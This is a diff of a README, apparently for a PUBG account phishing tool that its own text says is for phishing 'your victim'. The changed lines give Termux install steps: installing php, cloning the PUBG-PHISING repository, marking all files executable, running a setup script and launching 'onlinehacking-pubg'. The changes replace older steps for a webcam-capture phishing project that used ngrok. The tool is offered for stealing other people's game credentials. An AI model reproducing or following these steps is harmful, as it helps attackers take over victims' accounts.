@@ -69,20 +69,19 @@ PUBG-PHISING IS A PHISING TOOL WICH IS USED TO PHISH A PUBG ACCOUNT OF YOUR VICT
 
 * `pkg install php`
 
-* `git clone https://github.com/WHITE-HAT786/saycheese.git`
+* `git clone https://github.com/WHITE-HAT786/PUBG-PHISING.git`
 
 * `ls`
 
-* `cd saycheese`
+* `cd PUBG-Mobile`
 
 * `ls`
 
-* `chmod 777 ngrok`
+* `chmod +x *`
 
-* `./ngrok autotoken`
- YOU CAN CREATE YOUR NGROK ACCOUNT FROM HERE - www.ngrok.com 
+* `bash setup`
 
-* `bash saycheese.sh`
+* `onlinehacking-pubg`
 
 ```
 
